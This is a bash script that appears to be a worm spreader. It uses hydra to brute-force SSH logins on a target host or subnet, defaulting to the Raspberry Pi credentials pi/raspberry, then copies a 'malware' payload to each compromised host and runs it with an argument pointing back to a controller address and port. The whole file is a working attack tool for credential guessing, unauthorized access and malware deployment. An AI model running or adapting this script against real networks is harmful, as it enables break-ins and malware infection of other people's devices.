#!/bin/bash
# Objective
#	1. Identify hosts running SSH on port 22
#	2. Attempt to login to hosts using login pi/raspberry (or else if defined by cmd line params)
#	3. Copy some arbitrary malware to the target


# ---------------
# -- Variables --
# ---------------
# Some of these may be overridden by getopts
username="pi"
pass="raspberry"
port="22"

# Payload dir to send to the target PI
PAYLOAD="./client/"
CLIENT_EXE="client/run.py"

# ------------------
# -- Send Payload --
# ------------------
# Input:
#	$1: IP
#	$2: Port
#	$3: Username
#	$4: Password
function sendPayload() {
	# Make sure we've gotten all the right arguments
	if [[ $# != 4 ]]; then
		echo "Error: Expected 4 arguments to sendPayload() (got $#)"
		exit
	fi

	# TODO: Is $payload being escaped properly? 
	# TODO: Sending payload to $HOME on the remote machine, is there a better place for it?
	echo "Copying malware... " 
	sshpass -p "$4" scp -P ${2} -r "$PAYLOAD" "${3}@${1}:/home/${3}"
	echo "Starting malware... " 
	sshpass -p "$4" ssh -P "${3}@${1}" python3 "/home/${3}/${CLIENT_EXE}" 192.168.56.1 11111
}

# -------------------
# -- Display usage --
# -------------------
function usage () { 
	echo "Usage: $0"
	echo "Example: $0 -t 192.168.0.100"
	echo "Example: $0 -t 192.168.0.0/24"
	echo "Example: $0 -l username -p password -t 192.168.0.100"
	echo "Example: $0 -L user_file.txt -P pass_file.txt -t 192.168.0.100"
	exit 1
}

# Test an IP address for validity:
# Usage:
#      valid_ip IP_ADDRESS
#      if [[ $? -eq 0 ]]; then echo good; else echo bad; fi
#   OR
#      if valid_ip IP_ADDRESS; then echo good; else echo bad; fi
#
# Source: http://www.linuxjournal.com/content/validating-ip-address-bash-script
function valid_ip() {
    local  ip=$1
    local  stat=1

    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        OIFS=$IFS
        IFS='.'
        ip=($ip)
        IFS=$OIFS
        [[ ${ip[0]} -le 255 && ${ip[1]} -le 255 \
            && ${ip[2]} -le 255 && ${ip[3]} -le 255 ]]
        stat=$?
    fi
    return $stat
}


# Dealing with command line params
while getopts ":l:L:p:P:s:t:" opts; do
    case "${opts}" in
		# Manual username override
        l)
            username=${OPTARG}
            ;;
		# Manual username override (file)
        L)
            user_file=${OPTARG}
            ;;
		# Manual password override
        p)
            pass=${OPTARG}
            ;;
		# Manual password override (file)
        P)
            pass_file=${OPTARG}
            ;;
		# Service port override 
		s)
			port=${OPTARG}
			;;
		# Target
        t)
            target=${OPTARG}
            ;;
        *)
            usage
            ;;
    esac
done


# ----------------------
# -- Validating input --
# ----------------------
# Decide whether or not to use a constant username, or an input username file
# ie: Constant username, or username input file
userString="-l ${username}"
if [ ! -z "${user_file}" ]; then
	# Make sure that the file actually exists.
	if [ ! -r "${user_file}" ]; then
		echo "$0: cannot access username file '${user_file}'."
		usage
	fi
	userString="-L '${user_file}'"
fi

# Decide whether or not to use a constant password, or an input password file
# ie: Constant password, or password file
passString="-p ${pass}"
if [ ! -z "${pass_file}" ]; then
	# Make sure that the file actually exists.
	if [ ! -r "${pass_file}" ]; then
		echo "$0: cannot access password file '${pass_file}'."
		usage
	fi
	passString="-P '${pass_file}'"
fi

# Test if the IP given is valid. We don't bother checking the subnet mask,
# but we still strip it for testing
if [ -z "${target}" ]; then
	usage
fi
ip_addr=`echo ${target} | cut -d "/" -f 1`
echo "IP addr: $ip_addr"
if ! valid_ip "$ip_addr"; then 
	echo "$0: malformed target IP address recieved"
	usage
fi


# -------------------
# -- Probing hosts --
# -------------------
timestamp=`date +%Y-%m-%d_%H:%M:%S`
logfile="hydraProbe_${timestamp}.txt"
echo "hydra ${userString} ${passString} -o '${logfile}' -s ${port} ${target} ssh"
hydra ${userString} ${passString} -o ${logfile} -s ${port} ${target} ssh

echo ""


# Now that we have our output file, we can being working on it.
# Trash the first line of the file (information about the probe)
sed -i '1d' ${logfile}
while read line; do
	# Go through each identified host of the probe, and send them the payload.
	echo $line;

	ip=`echo $line | awk '{print $3}'`
	port=`echo $line | cut -d \[ -f 2 | cut -d \] -f 1`
	user=`echo $line | awk '{print $5}'`
	pass=`echo $line | awk '{print $7}'`

	echo "sendPayload ${ip} ${port} ${user} ${pass}"
	sendPayload ${ip} ${port} ${user} ${pass}
done < ${logfile}
